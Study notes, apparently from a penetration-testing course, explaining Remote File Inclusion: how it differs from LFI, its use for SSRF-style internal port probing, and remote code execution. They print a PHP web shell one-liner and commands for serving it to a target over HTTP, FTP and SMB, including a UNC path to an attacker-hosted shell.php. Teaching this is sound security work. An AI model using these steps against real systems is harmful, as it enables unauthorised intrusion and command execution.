RFI is an extension of the LFI concept. Instead of including a file that already exists on the target server, an application may be vulnerable to **including a file hosted remotely**.

The two major benefits highlighted in the material are:

1. **Enumerating local-only ports and web applications through SSRF**
    
2. **Potentially gaining RCE by including a malicious script hosted by the attacker**
    

![Image](https://images.openai.com/static-rsc-4/zYcxaTldy38K1S_dmqnwZl4ffkRjabkm5yp4QiFAeiT5MDGrnSgN4baDGgh_hNgyCRTFlORaMfG7kgUzJFGnfJj6D_oZUCFDlZlPxo1RJ2EM1ViLEWm25i7mtWdzRIGeaOpx7HthfQmvPqoZQef6cxdLRcEJ1JxivzgaGvxQSeMA1gZRCtnXjJFnd0G_3qSr?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/awidLMnQE0XoQjxy0zoaAwstcQA1DalRdStVYb_3Tek_9SDyiKSAVAOuUojuiyUATrohUzs_Q6aMm3Rl5RpZIpfo449wxu1u9IdLUJ_FYZWSAF8dTU2h2MicCB-r0f4kDT6qjMTaRYz7bLbAlcwQERZ-XObNuNxr6-cBDRyaJ-RwlhvRINnKDT_zan9yusoA?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/-5CDNDSnFo2VBaWbQsX3KbkKtyRpTKQtDULPQhIBtXgac48jDosZVWYCPljFeF8A6BK_4Vm4N7A48pSNMh6frirzQq9AEZigOC1tFe45O7f7Cu6C9TfO-mDoM86DnRteQrK6tYA4m1tEXEfNFqelLHZWtaaSsCue6l6bXTYGR8GiCwDPz10AvRIDKrtAuEI3?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/pjpiMmx2iCzdHpDJD-91ttS_VSLUGCkGdi77sDla-pKGtH-9cqAufEzO6Rgn9bIgjgDUJR-mhUFsoINelxzQN89zBFWDMCMzPrh7GiVqarJn04TVMBVu4Ekqm1yiD88JzssrC8rRwGDdwIXkcUX05DoSsCYZsVFs2Y49EcA9U84rZeBcpfAUwwAnlXgRTD2W?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/WVla-6fwkxTuAzQFcCln9xQJEeX7BxgB57u7K-hOdioprcq06dIEJgYx2D0PW5sG8IEmU6T9HvL2H_jS-P8rjkM02MPbC32KLU-hDTXM_ie1xtJeQaCnsu7rWJOtSVoxtcMIRTNOFceZS1ucV7sQ0mfSVCqBky8dl4-d9upuOElcHxG429M7bP33-60N2XI5?purpose=fullsize)

---

# 1. LFI vs RFI

### LFI — Local File Inclusion

The vulnerable application includes a file that exists **locally on the target**.

```text
Web Application
      ↓
LFI
      ↓
Local file
      ↓
/etc/passwd
```

### RFI — Remote File Inclusion

The vulnerable application includes a file from a **remote URL**.

```text
Attacker Server
      ↓
 malicious script
      ↓
     HTTP
      ↓
Target Web Application
      ↓
 Remote File Inclusion
      ↓
Potential Code Execution
```

The important difference is:

```text
LFI → Local files
RFI → Remote URLs
```

---

# ⭐ 2. Important RFI Requirements

Not every LFI vulnerability is automatically an RFI vulnerability.

For RFI to work, several conditions may need to be satisfied:

- The vulnerable function must permit remote URLs.
    
- You must have sufficient control over the filename/input.
    
- PHP/application configuration must allow remote inclusion where applicable.
    
- The included remote content must be processed in a way that provides the desired impact.
    

The source specifically emphasizes that modern web servers commonly disable remote inclusion by default.

---

# 3. RFI Is Usually Also LFI

A very important relationship:

```text
RFI
 ↓
Usually also allows
 ↓
LFI
```

Why?

A function that can process:

```text
http://remote-server/file
```

will generally also be capable of processing a local path.

However:

```text
LFI
 ↓
Does NOT necessarily mean
 ↓
RFI
```

The source gives three major reasons:

### ① Remote URLs may not be supported

The vulnerable function may only accept local files.

### ② Input may be restricted

You might control only part of a filename and therefore be unable to specify:

```text
http://
```

or another protocol scheme.

### ③ Configuration may prevent RFI

Modern configurations commonly disable remote file inclusion.

---

# 4. Function Capabilities

The source provides an important comparison:

|Function|Read Content|Execute|Remote URL|
|---|--:|--:|--:|
|PHP `include()` / `include_once()`|✅|✅|✅|
|PHP `file_get_contents()`|✅|❌|✅|
|Java `import`|✅|✅|✅|
|.NET `@Html.RemotePartial()`|✅|❌|✅|
|.NET `include`|✅|✅|✅|

This table is important because **remote file access does not automatically mean remote code execution**.

For example:

```text
file_get_contents()
```

can retrieve a remote resource but does not execute its contents as PHP code.

---

# ⭐ 5. RFI Can Also Act Like SSRF

This is one of the most important concepts in this section.

Suppose the target server can access:

```text
127.0.0.1:80
127.0.0.1:8080
127.0.0.1:3000
```

but those services aren't directly accessible from your machine.

RFI can potentially make the **target server** request them.

```text
Your Machine
     │
     │ RFI
     ▼
Target Server
     │
     │ request
     ▼
127.0.0.1:8080
     │
     ▼
Internal Application
```

Therefore:

> **An RFI vulnerability can potentially be leveraged for SSRF-style internal service enumeration.**

---

# 🔎 6. Verifying RFI

The first configuration check in PHP is:

```text
allow_url_include
```

The material demonstrates checking:

```text
allow_url_include = On
```

This indicates that the relevant PHP setting is enabled.

But there is an important warning:

> **`allow_url_include = On` does not guarantee that the vulnerable function actually supports remote URL inclusion.**

The more reliable method is to **test whether a URL can actually be included**.

---

# ⭐ 7. Start With a Local URL

When testing RFI, the material recommends initially trying a URL pointing back to the target itself.

Example:

```text
http://127.0.0.1:80/index.php
```

Conceptually:

```text
RFI parameter
      ↓
http://127.0.0.1:80/index.php
      ↓
Target requests itself
      ↓
Response appears in vulnerable page
```

If this works, it demonstrates that the vulnerable function can include URLs.

---

# 8. What Does Successful Inclusion Tell Us?

The example demonstrates something especially important.

The remote `index.php` wasn't displayed as source code.

Instead:

```text
index.php
   ↓
PHP executed
   ↓
HTML rendered
```

That means the vulnerable function is not merely downloading the remote file—it is processing it in a way that allows PHP execution.

This is what makes malicious remote PHP inclusion potentially lead to RCE.

---

# 🔥 9. RFI → Internal Port Enumeration

The example also demonstrates specifying:

```text
127.0.0.1:80
```

This is significant because the port is controlled in the URL.

If another internal application is running on:

```text
127.0.0.1:8080
```

the same concept could potentially be used to access it.

General idea:

```text
RFI
 ↓
127.0.0.1:PORT
 ↓
Internal service
 ↓
Response
```

This is essentially where RFI overlaps with **SSRF**.

---

# ⚠️ 10. Recursive Inclusion / DoS

The material contains an important warning.

Including the vulnerable page itself can cause:

```text
index.php
 ↓
includes index.php
 ↓
includes index.php
 ↓
includes index.php
 ↓
...
```

This can create a **recursive inclusion loop** and potentially cause a denial-of-service condition.

So:

> Avoid blindly including the vulnerable page itself during testing.

---

# 🔥 11. RFI → Remote Code Execution

The main RCE concept is:

```text
Create malicious PHP script
          ↓
Host script on attacker-controlled server
          ↓
Target includes remote script
          ↓
PHP executes script
          ↓
Potential command execution
```

The source uses a simple PHP shell concept:

```php
<?php system($_GET["cmd"]); ?>
```

The important concept is not the exact shell—it is that the **remote PHP file is executed by the vulnerable target**.

---

# 12. Hosting the Remote Script

Once the malicious script has been created, it needs to be accessible from the target.

The material recommends considering common HTTP ports such as:

```text
80
443
```

because outbound filtering may permit common web traffic while blocking unusual ports.

Other protocols covered later include:

```text
HTTP
FTP
SMB
```

---

# 🌐 13. HTTP-Based RFI

For HTTP, the material demonstrates a basic Python web server:

```bash
sudo python3 -m http.server <LISTENING_PORT>
```

This creates a simple HTTP server serving files from the current directory.

Conceptually:

```text
Attacker machine
      │
      │ HTTP
      ▼
Python HTTP server
      │
      ▼
shell.php
```

The source shows the server listening on:

```text
0.0.0.0:<LISTENING_PORT>
```

---

# 14. HTTP RFI Flow

The complete flow is:

```text
                 ATTACKER
                    │
              shell.php
                    │
              HTTP Server
                    │
                    │ HTTP GET
                    ▼
              TARGET SERVER
                    │
                  RFI
                    │
                    ▼
              PHP executes
                    │
                    ▼
               OS command
```

The source demonstrates the target requesting the attacker's `shell.php`, followed by command execution.

---

# 🔎 15. Check Your HTTP Server Logs

One of the best practical tips in the source is to examine your own server's connection logs.

If the target requests:

```text
/shell.php
```

you should see a corresponding HTTP request on your server.

For example:

```text
SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
```

This confirms that:

```text
Target → Your Server
```

actually occurred.

---

# ⭐ 16. Why Server Logs Are Useful

Logs can reveal whether the target modifies your requested URL.

For example, suppose you request:

```text
shell.php
```

but your server receives:

```text
shell.php.php
```

That tells you the target application is appending an extension.

The source specifically recommends examining the connection to determine whether an extra extension has been appended, allowing you to adjust the input accordingly.

This is a very useful troubleshooting technique.

---

# 📡 17. FTP-Based RFI

RFI doesn't necessarily have to use HTTP.

The source also demonstrates using:

```text
ftp://
```

The idea is:

```text
Attacker
   │
   │ FTP
   ▼
FTP Server
   │
   ▼
Remote PHP file
   │
   ▼
Target RFI
```

This can be useful if:

- HTTP traffic is blocked
    
- `http://` is blocked by a WAF
    
- Another protocol is permitted
    

---

# 18. Python FTP Server

The source uses Python's `pyftpdlib`:

```bash
sudo python -m pyftpdlib -p 21
```

The server listens on the standard FTP port:

```text
21
```

The output indicates the FTP server has started and is ready to accept connections.

---

# 19. FTP Authentication

The material points out that PHP attempts to authenticate to FTP as:

```text
anonymous
```

by default.

If authentication is required, credentials can be included in the FTP URL.

Conceptually:

```text
ftp://user:password@server/file
```

The source demonstrates this behavior with a credentialed FTP URL.

---

# ⭐ 20. SMB-Based RFI

SMB is particularly interesting for **Windows targets**.

The source explains that Windows can treat remote SMB resources as normal files using UNC paths.

Therefore, in the relevant Windows scenario, RFI through SMB does **not necessarily require `allow_url_include` to be enabled**.

---

# 21. UNC Paths

A Windows UNC path looks like:

```text
\\SERVER\SHARE\FILE
```

Conceptually:

```text
\\<ATTACKER_IP>\share\shell.php
```

The target accesses:

```text
Attacker SMB Server
        ↓
     share
        ↓
    shell.php
```

---

# 22. Starting an SMB Server

The material uses Impacket's SMB server:

```bash
impacket-smbserver -smb2support share $(pwd)
```

This creates an SMB share named:

```text
share
```

and serves the current directory.

The source notes that anonymous authentication is enabled by default in this setup.

---

# 23. Windows RFI Flow

```text
              ATTACKER
                 │
          SMB Server
                 │
              share
                 │
             shell.php
                 │
                 ▼
          WINDOWS TARGET
                 │
           UNC Path
                 │
                 ▼
              RFI
                 │
                 ▼
          PHP execution
                 │
                 ▼
          Command execution
```

The example uses a Windows target and demonstrates command execution under:

```text
NT AUTHORITY\IUSR
```

---

# ⚠️ 24. SMB Limitation

The source gives an important practical limitation:

SMB-based remote inclusion is **more likely to work when the attacker and target are on the same network**.

Why?

Because SMB access over the public Internet may be disabled by default by Windows/server/network configurations.

So:

```text
Same network
   ↓
SMB → More likely to work

Internet
   ↓
SMB → May be blocked
```

---

# 🔥 25. HTTP vs FTP vs SMB

|Method|Protocol|Main Use|Important Consideration|
|---|---|---|---|
|**HTTP**|`http://`|Standard RFI|Common outbound traffic|
|**FTP**|`ftp://`|Alternative RFI|Useful if HTTP is blocked|
|**SMB**|UNC path|Windows targets|More practical on same network|

---

# 🧠 26. RFI Verification Checklist

When you encounter a suspected RFI:

### Step 1 — Identify the vulnerable function

Determine whether it can:

```text
Read remote content?
Execute remote content?
```

### Step 2 — Check PHP configuration

Look for:

```text
allow_url_include
```

### Step 3 — Don't rely exclusively on configuration

Even if:

```text
allow_url_include = On
```

test actual URL inclusion.

### Step 4 — Start with localhost

Try to establish whether the target can retrieve a local URL.

### Step 5 — Check whether the content executes

There is a major difference between:

```text
Remote file retrieved
```

and:

```text
Remote PHP executed
```

### Step 6 — Check your server logs

Confirm the target actually connected to your server.

---

# 🎯 27. RFI Attack Chain

The entire process can be summarized as:

```text
                 Suspected LFI
                       │
                       ▼
             Can it include URLs?
                       │
                ┌──────┴──────┐
                │             │
               NO            YES
                │             │
                ▼             ▼
              LFI       Test localhost URL
                              │
                              ▼
                       URL successfully
                          included?
                              │
                         ┌────┴────┐
                         │         │
                        NO        YES
                         │         │
                         ▼         ▼
                        LFI      RFI
                                   │
                      ┌────────────┴────────────┐
                      │                         │
                      ▼                         ▼
                    SSRF                       RCE
                      │                         │
              Internal services        Remote malicious
                                        PHP script
```

---

# ⭐ 28. Important Concepts to Memorize

### RFI

> **Remote File Inclusion allows a vulnerable application to include files from remote URLs.**

### RFI → SSRF

If remote content can be requested but not executed, RFI may still provide SSRF-like access to internal services.

### RFI → RCE

If remote PHP is actually included and executed, a malicious remote script may result in RCE.

### `allow_url_include`

Important PHP configuration for remote URL inclusion.

### Configuration isn't enough

```text
allow_url_include = On
```

doesn't automatically prove that the particular vulnerable function supports RFI.

### Localhost testing

Start with a local URL to help distinguish RFI capability from network/firewall problems.

### Server logs

Your HTTP/FTP/SMB server logs can confirm whether the target actually requested your file.

---

# 🔴 29. Most Important Warnings

### ⚠️ Recursive inclusion

Including the vulnerable page itself may cause:

```text
infinite recursion → DoS
```

### ⚠️ RFI doesn't always mean RCE

A function can retrieve remote content without executing it.

### ⚠️ `allow_url_include` isn't universal

Different languages/frameworks and functions have different capabilities.

### ⚠️ SMB is environment-dependent

Windows SMB inclusion is particularly dependent on network accessibility.

---

# 📚 30. Quick Revision Table

|Concept|Remember|
|---|---|
|**LFI**|Include local files|
|**RFI**|Include remote files|
|**RFI → SSRF**|Access internal services through target|
|**RFI → RCE**|Possible when remote code gets executed|
|**PHP setting**|`allow_url_include`|
|**First verification**|Try a URL|
|**Safer initial target**|Localhost URL|
|**HTTP server**|Python `http.server`|
|**FTP server**|`pyftpdlib`|
|**Windows remote files**|UNC paths / SMB|
|**SMB server**|Impacket `smbserver.py`|
|**Useful evidence**|Server connection logs|
|**Major danger**|Recursive inclusion / DoS|

---

# 🧠 FINAL MEMORY MAP

```text
                         RFI
                          │
          ┌───────────────┴────────────────┐
          │                                │
          ▼                                ▼
     Remote Content                     RCE
          │                                │
          ▼                                ▼
        SSRF                     Malicious PHP Script
          │                                │
          ▼                                ▼
 Internal Ports/Apps                  HTTP / FTP / SMB
                                          │
                          ┌───────────────┼──────────────┐
                          ▼               ▼              ▼
                        HTTP             FTP            SMB
                          │               │              │
                     Common web       Alternative    Windows/
                     traffic          protocol       UNC paths
```

### 🔥 One-line takeaway

> **RFI is essentially LFI with remote-resource access: when remote content can only be read, think SSRF; when remote PHP/code is actually executed, think RCE.**